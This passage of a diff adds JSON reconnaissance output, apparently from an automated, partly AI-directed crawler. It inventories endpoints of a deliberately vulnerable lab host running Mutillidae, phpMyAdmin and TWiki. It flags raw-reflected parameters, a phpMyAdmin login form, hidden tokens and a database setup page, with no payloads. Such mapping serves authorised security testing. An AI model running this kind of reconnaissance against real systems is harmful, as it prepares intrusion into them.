+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/images/toad-for-mysql-77-80.jpg",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/jpeg",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/images/twitter.gif",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/gif",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/images/youtube_256_256.png",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/png",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/index.php",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<br /> <b>Warning</b>: mysqli::mysqli() [<a href='function.mysqli-mysqli'>function.mysqli-mysqli</a>]: (HY000/2002): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2",
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/index.php?do=toggle-hints&page=home.php",
+      "method": "GET",
+      "params": [
+        {
+          "name": "do",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "toggle-hints"
+          ],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "page",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "home.php"
+          ],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "page"
+      ],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<br /> <b>Warning</b>: mysqli::mysqli() [<a href='function.mysqli-mysqli'>function.mysqli-mysqli</a>]: (HY000/2002): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2",
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; reflection=raw"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/index.php?page=add-to-your-blog.php",
+      "method": "POST",
+      "params": [
+        {
+          "name": "csrf-token",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "blog_entry",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "add-to-your-blog-php-submit-button",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/mutillidae/index.php?page=add-to-your-blog.php",
+          "method": "POST",
+          "fields": [
+            "csrf-token",
+            "blog_entry",
+            "add-to-your-blog-php-submit-button"
+          ],
+          "field_types": {
+            "csrf-token": "hidden",
+            "blog_entry": "text",
+            "add-to-your-blog-php-submit-button": "submit"
+          },
+          "hidden_values": {
+            "csrf-token": "SecurityIsDisabled"
+          },
+          "page_url": "https://server.vulnapp.id/mutillidae/?page=add-to-your-blog.php",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/index.php?page=home.php",
+      "method": "GET",
+      "params": [
+        {
+          "name": "page",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "home.php"
+          ],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "page"
+      ],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<br /> <b>Warning</b>: mysqli::mysqli() [<a href='function.mysqli-mysqli'>function.mysqli-mysqli</a>]: (HY000/2002): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2",
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; discovered by Katana; reflection=raw"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/index.php?page=password-generator.php&username=anonymous",
+      "method": "GET",
+      "params": [
+        {
+          "name": "page",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "password-generator.php"
+          ],
+          "reflected": true,
+          "notes": null
+        },
+        {
+          "name": "username",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "anonymous"
+          ],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "password-generator-php-submit-button",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "page"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/mutillidae/index.php?page=password-generator.php&username=anonymous",
+          "method": "GET",
+          "fields": [
+            "password-generator-php-submit-button"
+          ],
+          "field_types": {
+            "password-generator-php-submit-button": "button"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/mutillidae/index.php?page=password-generator.php&username=anonymous",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<br /> <b>Warning</b>: mysqli::mysqli() [<a href='function.mysqli-mysqli'>function.mysqli-mysqli</a>]: (HY000/2002): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2",
+      "notes": "discovered by Katana; discovered by Katana; reflection=raw"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/index.php?page=redirectandlog.php&forwardurl=http://www.php.net/",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/javascript/bookmark-site.js",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "application/x-javascript",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "/*********************************************** * Bookmark site script- � Dynamic Drive DHTML code library (www.dynamicdrive.com) * This notice MUST stay intact for legal use * Visit Dynamic Drive at",
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/javascript/ddsmoothmenu/Download/",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/javascript/ddsmoothmenu/ddsmoothmenu.js",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "application/x-javascript",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "//** Smooth Navigational Menu- By Dynamic Drive DHTML code library: http://www.dynamicdrive.com //** Script Download/ instructions page: http://www.dynamicdrive.com/dynamicindex1/ddlevelsmenu/ //** Me",
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/javascript/ddsmoothmenu/g",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/javascript/ddsmoothmenu/here///////////////////////////",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/javascript/ddsmoothmenu/jquery.min.js",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "application/x-javascript",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "/* * jQuery JavaScript Library v1.3.2 * http://jquery.com/ * * Copyright (c) 2009 John Resig * Dual licensed under the MIT and GPL licenses. * http://docs.jquery.com/License * * Date: 2009-02-19 17:34",
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/javascript/follow-mouse.js",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "application/x-javascript",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/set-up-database.php",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/1999/REC-html401-19991224/loose.dtd\"> <html> <head> <link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon",
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana; AI-directed path: Discovered application setup and database initialization endpoint."
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/source-viewer.php/text-viewer.php",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/styles/ddsmoothmenu/ddsmoothmenu-v.css",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/css",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/styles/ddsmoothmenu/ddsmoothmenu.css",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/css",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/mutillidae/styles/global-styles.css",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/css",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana; discovered by Katana; discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/oops/TWiki/TWikiHistory?template=oopsrev&param1=1.10",
+      "method": "GET",
+      "params": [
+        {
+          "name": "template",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "oopsrev"
+          ],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "param1",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "1.10"
+          ],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /oops/TWiki/TWikiHistory was not found on this server",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/openapi.json",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/phpMyAdmin/",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\" dir=\"ltr\"> ",
+      "notes": "discovered by Katana; AI-directed path: Discovered administrative interface path."
+    },
+    {
+      "url": "https://server.vulnapp.id/phpMyAdmin/index.php",
+      "method": "POST",
+      "params": [
+        {
+          "name": "phpMyAdmin",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "db",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "table",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "lang",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "convcharset",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "token",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "pma_username",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "pma_password",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "server",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/phpMyAdmin/index.php",
+          "method": "POST",
+          "fields": [
+            "phpMyAdmin",
+            "db",
+            "table",
+            "lang",
+            "convcharset",
+            "token",
+            "phpMyAdmin",
+            "lang",
+            "phpMyAdmin"
+          ],
+          "field_types": {
+            "phpMyAdmin": "hidden",
+            "db": "hidden",
+            "table": "hidden",
+            "lang": "text",
+            "convcharset": "hidden",
+            "token": "hidden"
+          },
+          "hidden_values": {
+            "phpMyAdmin": "2b9ab06833d8371f2429b72851c4d42eb64f1c84",
+            "db": "",
+            "table": "",
+            "lang": "en-utf-8",
+            "convcharset": "utf-8",
+            "token": "98f06e7b5cf3ba11429845a2b952d340"
+          },
+          "page_url": "https://server.vulnapp.id/phpMyAdmin/",
+          "has_password_field": false,
+          "likely_login": false
+        },
+        {
+          "action": "https://server.vulnapp.id/phpMyAdmin/index.php",
+          "method": "POST",
+          "fields": [
+            "phpMyAdmin",
+            "phpMyAdmin",
+            "pma_username",
+            "pma_password",
+            "server",
+            "phpMyAdmin",
+            "lang",
+            "convcharset",
+            "token"
+          ],
+          "field_types": {
+            "phpMyAdmin": "hidden",
+            "pma_username": "text",
+            "pma_password": "password",
+            "server": "hidden",
+            "lang": "hidden",
+            "convcharset": "hidden",
+            "token": "hidden"
+          },
+          "hidden_values": {
+            "phpMyAdmin": "2b9ab06833d8371f2429b72851c4d42eb64f1c84",
+            "server": "1",
+            "lang": "en-utf-8",
+            "convcharset": "utf-8",
+            "token": "98f06e7b5cf3ba11429845a2b952d340"
+          },
+          "page_url": "https://server.vulnapp.id/phpMyAdmin/",
+          "has_password_field": true,
+          "likely_login": true
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/phpMyAdmin/phpmyadmin.css.php?lang=en-utf-8&convcharset=utf-8&token=98f06e7b5cf3ba11429845a2b952d340&js_frame=right&nocache=2457687151",
+      "method": "GET",
+      "params": [
+        {
+          "name": "lang",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "en-utf-8"
+          ],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "convcharset",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "utf-8"
+          ],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "token",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "98f06e7b5cf3ba11429845a2b952d340"
+          ],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "js_frame",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "right"
+          ],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nocache",
+          "location": "query",
+          "type_hint": "number",
+          "examples": [
+            "2457687151"
+          ],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/css",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": ".syntax_comment {color: #808000;} .syntax_comment_mysql {} .syntax_comment_ansi {} .syntax_comment_c {} .syntax_digit {} .syntax_digit_hex {color: teal;} .syntax_digit_integer {color: teal;} .syntax_d",
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/phpMyAdmin/phpmyadmin.css.php?token=98f06e7b5cf3ba11429845a2b952d340&js_frame=right&nocache=2457687151",
+      "method": "GET",
+      "params": [
+        {
+          "name": "token",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "98f06e7b5cf3ba11429845a2b952d340"
+          ],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "js_frame",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "right"
+          ],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nocache",
+          "location": "query",
+          "type_hint": "number",
+          "examples": [
+            "2457687151"
+          ],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/css",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/phpMyAdmin/print.css",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/css",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "katana",
+      "response_snippet": null,
+      "notes": "discovered by Katana"
+    },
+    {
+      "url": "https://server.vulnapp.id/phpMyAdmin/themes/original/img/logo_right.png",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/png",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/phpMyAdmin/themes/original/img/s_warn.png",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "image/png",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "network",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/rdiff/TWiki/TWikiHistory",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /rdiff/TWiki/TWikiHistory was not found on this serve",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/rdiff/TWiki/TWikiHistory?rev1=1.10&rev2=1.9",
+      "method": "GET",
+      "params": [
+        {
+          "name": "rev1",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "1.10"
+          ],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "rev2",
+          "location": "query",
+          "type_hint": "unknown",
+          "examples": [
+            "1.9"
+          ],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /rdiff/TWiki/TWikiHistory was not found on this serve",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/rest",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/robots.txt",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/sitemap.xml",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/swagger.json",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/swagger/v1/swagger.json",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "guess",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "discovered by Katana; AI-directed path: Discovered application root path for TWiki installation."
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/FileAttachment",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /twiki/FileAttachment was not found on this server.</",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/FileAttribute",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /twiki/FileAttribute was not found on this server.</p",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/PeterThoeny",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        404
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL /twiki/PeterThoeny was not found on this server.</p> ",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/TWikiDocumentation.html",
+      "method": "GET",
+      "params": [
+        {
+          "name": "filename",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "filepath",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "filecomment",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "createlink",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "hidefile",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "changeproperties",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/TWikiDocumentation.html",
+          "method": "GET",
+          "fields": [
+            "filename",
+            "filepath",
+            "filecomment",
+            "createlink",
+            "hidefile",
+            "changeproperties"
+          ],
+          "field_types": {
+            "filename": "hidden",
+            "filepath": "file",
+            "filecomment": "text",
+            "createlink": "checkbox",
+            "hidefile": "checkbox",
+            "changeproperties": "submit"
+          },
+          "hidden_values": {
+            "filename": "Sample.txt"
+          },
+          "page_url": "https://server.vulnapp.id/twiki/TWikiDocumentation.html",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<html><head> <title>TWikiDocumentation</title> </head><body bgcolor=\"#ffffff\"> <h1><a name=\"_TWiki_Reference_Manual_01_Feb_2\"> TWiki Reference Manual (01 Feb 2003) </a></h1> <p /> <script language=\"Ja",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/TWikiHistory.html",
+      "method": "GET",
+      "params": [],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<html><head> <title>TWikiHistory</title> </head><body bgcolor=\"#ffffff\"> <p /> <ul> <li> <a href=\"#Appendix_B_TWiki_Development_Tim\">Appendix B: TWiki Development Timeline</a> <ul> <li> <a href=\"#01_F",
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/edit/TWiki/TWikiForms?topicparent=Main.WebHome",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topicparent",
+          "location": "query",
+          "type_hint": "unknown",
